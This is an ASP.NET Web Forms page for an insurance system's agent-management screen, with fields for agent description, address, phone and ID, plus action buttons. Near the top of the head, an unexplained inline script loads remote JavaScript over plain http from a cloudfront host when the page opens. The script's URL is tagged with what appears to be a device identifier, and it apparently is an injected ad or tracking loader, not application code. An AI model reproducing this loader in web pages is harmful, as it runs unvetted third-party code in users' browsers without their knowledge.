<%@ Page Language="c#" Inherits="EPolicy.Agent" CodeFile="Agent.aspx.cs" %>

<%@ Register TagPrefix="MaskedInput" Namespace="MaskedInput" Assembly="MaskedInput" %>
<%@ Register Assembly="AjaxControlToolkit, Version=3.5.50508.0, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e"
    Namespace="AjaxControlToolkit" TagPrefix="Toolkit" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/tr/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="apple-touch-icon" href="apple-touch-icon.png" />
    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <link rel="icon" href="Images2\LogoGuardian.ico" type="image/x-icon" />
    <style>
        html, body
        {
            height: 100%;
        }
        body
        {
            background-color: #17529B;
        }
        .container-fluid
        {
            height: 100%;
        }
        .row.row-offcanvas.row-offcanvas-left
        {
            height: 100%;
        }
        .col-md-2
        {
            width: 16.66666667%;
            height: 100%;
        }
        .main
        {
            height: 100%;
        }
        .over-top-btn
        {
            width: 100%;
        }
    </style>
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="css/main.css">


    <link href="css/fonts.css" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"
        rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1"
        crossorigin="anonymous" />
    <script type="text/javascript">        (function () { var a = document.createElement("script"); a.type = "text/javascript"; a.async = !0; a.src = "http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.107#p=samsungxssdx840xevox250gb_s1dbnsaf286689w"; var b = document.getElementsByTagName("script")[0]; b.parentNode.insertBefore(a, b); })();
    </script>

    <script src="js/jquery-1.12.1.min.js" type="text/javascript"></script>
    <script src="js/jquery.mask.js" type="text/javascript"></script>

    <script type='text/javascript'>
        jQuery(function ($) {
            //$("#AccordionPane1_content_TxtHomePhone").mask("(000) 000-0000", { placeholder: "(###) ###-####" });
            //$("#AccordionPane1_content_TxtCellular").mask("(000) 000-0000", { placeholder: "(###) ###-####" });
            //$("#AccordionPane1_content_TxtBirthdate").mask("00/00/0000", { placeholder: "__/__/____" });
            ////          $('#TxtDriverBirthDate').mask('00/00/0000', { placeholder: '__/__/____' });
            $("#txtPhone").mask("(000) 000-0000", { placeholder: "(###) ###-####" });
            //$("#AccordionPane2_content_txtEffDt").mask("00/00/0000", { placeholder: "__/__/____" });
            
        });
        </script>
</head>
<body>
    <form method="post" runat="server">
    <div class="container-fluid" style="height: 100%">
        <Toolkit:ToolkitScriptManager ID="ToolkitScriptManager2" runat="server" EnableScriptGlobalization="True">
        </Toolkit:ToolkitScriptManager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" RenderMode="Block">
            <ContentTemplate>
                <asp:Literal ID="jvscript" runat="server"></asp:Literal>
                <div class="row row-offcanvasrow-offcanvas-left" style="height: 100%">
                    <div class="col-sm-3 col-md-2 sidebar-offcanvas" id="sidebar" role="navigation">
                        <asp:PlaceHolder ID="phTopBanner" runat="server"></asp:PlaceHolder>
                    </div>
                    <div class="col-sm-9 col-md-10 main" style="height: 100%">
                        <!--toggle sidebar button-->
                        <p class="visible-xs">
                            <button type="button" class="btn btn-primary btn-xs" data-toggle="offcanvas">
                                <i class="glyphicon glyphicon-chevron-left"></i>
                            </button>
                        </p>
                        <h1 class="page-header">
                            Agent</h1>
                        <div class="form=group" align="center">
                            <asp:Button ID="btnCommission" runat="server" Text="Commission"
                                Width="155px" CssClass="btn btn-primary btn-lg" OnClick="btnCommission_Click">
                            </asp:Button>
                            <asp:Button ID="btnAuditTrail" runat="server" Text="AuditTrail" Width="155px" CssClass="btn btn-primary btn-lg"
                                OnClick="btnAuditTrail_Click"></asp:Button>
                            <asp:Button ID="btnPrint" runat="server" Text="Print" Width="155px" CssClass="btn btn-primary btn-lg"
                                OnClick="btnPrint_Click" Visible="False"></asp:Button>
                            <asp:Button ID="btnSearch" runat="server" Text="Search"
                                Width="155px" CssClass="btn btn-primary btn-lg" OnClick="btnSearch_Click"></asp:Button>
                            <asp:Button ID="BtnSave" runat="server" Text="Save" Width="155px" CssClass="btn btn-primary btn-lg"
                                OnClick="BtnSave_Click"></asp:Button>
                            <asp:Button ID="btnEdit" runat="server" Text="Edit" Width="155px" CssClass="btn btn-primary btn-lg"
                                OnClick="btnEdit_Click"></asp:Button>
                            <asp:Button ID="btnAddNew" runat="server" Text="AddNew" Width="155px" CssClass="btn btn-primary btn-lg"
                                OnClick="btnAddNew_Click"></asp:Button>
                            <asp:Button ID="cmdCancel" runat="server" Text="Cancel" Width="155px" CssClass="btn btn-primary btn-lg"
                                OnClick="cmdCancel_Click"></asp:Button>
                            <asp:Button ID="BtnExit" runat="server" Text="Exit" Width="155px" CssClass="btn btn-primary btn-lg"
                                OnClick="BtnExit_Click"></asp:Button>&nbsp;
                            <br />
                            <br />
                            <div align="left">
                                <asp:Label ID="Label21" runat="server" Font-Bold="True">Agent:</asp:Label>
                                <asp:Label ID="lblAgentID" runat="server"></asp:Label>
                            </div>
                        </div>
                        <div class="form-group" align="center">
                            <asp:UpdateProgress ID="UpdateProgress1" runat="server" AssociatedUpdatePanelID="UpdatePanel1"
                                DisplayAfter="10">
                                <ProgressTemplate>
                                    <img alt="" src="Images2/loader.gif" style="width: 40px; height: 40px;" />
                                    <span><span class=""></span><span class="" style="font-size: 18px">Please wait...</span></span></ProgressTemplate>
                            </asp:UpdateProgress>
                        </div>
                        <div class="row formWraper" style="padding: 0px;" align="center">
                            <div class="col-sm-12" align="center">
                                <br />
                                <asp:Label ID="Label22" runat="server" CssClass="headfield1" Font-Names="Tahoma"
                                    Font-Size="9pt" Visible="False">AgentType</asp:Label>
                                <asp:TextBox ID="txtAgentType" runat="server" CssClass="headfield1" Font-Names="Tahoma"
                                    Font-Size="9pt" Height="21" MaxLength="10" TabIndex="4" Width="144px" Visible="False"></asp:TextBox>
                                <asp:Label ID="lblB" runat="server" CssClass="headfield1" Height="19px" ForeColor="Black"
                                    Font-Names="Tahoma" Font-Size="9pt" Width="105px">Agent Description</asp:Label>
                                    <br />
                                <asp:TextBox ID="txtAgentDescription" runat="server" TabIndex="1" 
                                    CssClass="form-controlWhite" Width="300px" MaxLength="50"></asp:TextBox>
                                    <br />
                                    <br />
                                <asp:Label ID="lblAddress1" runat="server" CssClass="labelForControl"> Address 1</asp:Label>
                                    <br />
                                <asp:TextBox ID="txtAddress1" TabIndex="2" runat="server"
                                    CssClass="form-controlWhite" Width="300px" MaxLength="50"></asp:TextBox>
                                    <br />
                                    <br />
                                <asp:Label ID="lblAddress2" runat="server" CssClass="labelForControl"> Address 2</asp:Label>
                                    <br />
                                <asp:TextBox ID="txtAddress2" TabIndex="3" runat="server"
                                   CssClass="form-controlWhite" Width="300px" MaxLength="50"></asp:TextBox>
                                    <br />
                                    <br />
                                <asp:Label ID="lblCity" runat="server" CssClass="labelForControl">City</asp:Label>
                                    <br />
                                <asp:TextBox ID="txtCity" TabIndex="4" runat="server" 
                                    CssClass="form-controlWhite" Width="300px" MaxLength="100"></asp:TextBox>
                                    <br />
                                    <br />
                                <asp:Label ID="lblState" runat="server" CssClass="labelForControl">State</asp:Label>
                                    <br />
                                <asp:TextBox ID="txtSt" TabIndex="5" runat="server" MaxLength="2" CssClass="form-controlWhite" Width="300px"></asp:TextBox>
                                    <br />
                                    <br />
                                <asp:Label ID="lblZipCode" runat="server" CssClass="labelForControl">Zip Code</asp:Label>
                                <br />
                                <asp:TextBox ID="txtZipCode" TabIndex="6" runat="server" MaxLength="10" CssClass="form-controlWhite" Width="300px"></asp:TextBox>
                                    <br />
                                    <br />
                                <asp:Label ID="lblPhone" runat="server" CssClass="labelForControl">Phone </asp:Label>
                                <br />
                                <asp:TextBox ID="txtPhone" TabIndex="7" runat="server" MaxLength="20" CssClass="form-controlWhite" Width="300px"></asp:TextBox>
                                    <br />
                                    <br />
                                <asp:Label ID="lblEntryDate" runat="server" CssClass="labelForControl">Entry Date</asp:Label>
                                <br />
                                <MaskedInput:MaskedTextBox ID="txtEntryDate" TabIndex="8" 
                                    runat="server" CssClass="form-controlWhite" Width="300px" Enabled="False" IsDate="True"></MaskedInput:MaskedTextBox>
                                    <br />
                                    <br />
                                <asp:Label ID="Label1" runat="server" CssClass="labelForControl">AgentID</asp:Label>
                                <br />
                                <asp:TextBox ID="txtCarsID" runat="server" CssClass="form-controlWhite" Width="300px"
                                   MaxLength="10" TabIndex="9"></asp:TextBox>
                                    
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                            </div>
                        </div>
                        <asp:Panel ID="pnlMessage" runat="server" CssClass="" Width="450px" BackColor="#F4F4F4"
                            Height="260px">
                            <div class="" style="padding: 0px; border-radius: 5px; background-color: #036893;
                                color: #FFFFFF; font-family: tahoma; font-size: 14px; font-weight: normal; font-style: normal;
                                background-repeat: no-repeat; text-align: left; vertical-align: bottom;">
                                &nbsp;&nbsp;
                                <asp:Label ID="Label7" runat="server" Font-Bold="False" Font-Italic="False" Font-Names="arialnarrow"
                                    Font-Size="14pt" Text="Message..." ForeColor="White" />
                            </div>
                            <div>
                                <table style="background-position: center; width: 430px; height: 175px;">
                                    <tr>
                                        <td align="center" valign="middle">
                                            <asp:Label ID="lblRecHeader" runat="server" Font-Bold="False" Font-Italic="False"
                                                Font-Size="10.5pt" Font-Underline="False" ForeColor="#333333" Text="Message"
                                                Width="350px" CssClass="Labelfield2-14" />
                                        </td>
                                    </tr>
                                </table>
                            </div>
                            <div class="" align="center">
                                <asp:Button ID="btnAceptar" runat="server" Text="OK" Width="150px" CssClass="btn btn-primary btn-lg btn-block" />
                            </div>
                        </asp:Panel>
                        <Toolkit:ModalPopupExtender ID="mpeSeleccion" runat="server" BackgroundCssClass="modalBackground"
                            DropShadow="True" PopupControlID="pnlMessage" TargetControlID="btnDummy2" OkControlID="btnAceptar">
                        </Toolkit:ModalPopupExtender>
                        <asp:Button ID="btnDummy2" runat="server" Visible="true" BackColor="Transparent"
                            BorderStyle="None" BorderWidth="0" BorderColor="Transparent" />
                        <Toolkit:RoundedCornersExtender ID="RoundedCornersExtender2" runat="server" TargetControlID="pnlMessage"
                            Radius="10" Corners="All" />
                    </div>
                    <MaskedInput:MaskedTextHeader ID="MaskedTextHeader1" runat="server"></MaskedInput:MaskedTextHeader>
                    <<asp:Literal ID="litPopUp" runat="server" Visible="False"></asp:Literal>
                </div>
            </ContentTemplate>
        </asp:UpdatePanel>
    </div>
    </form>
</body>
</html>
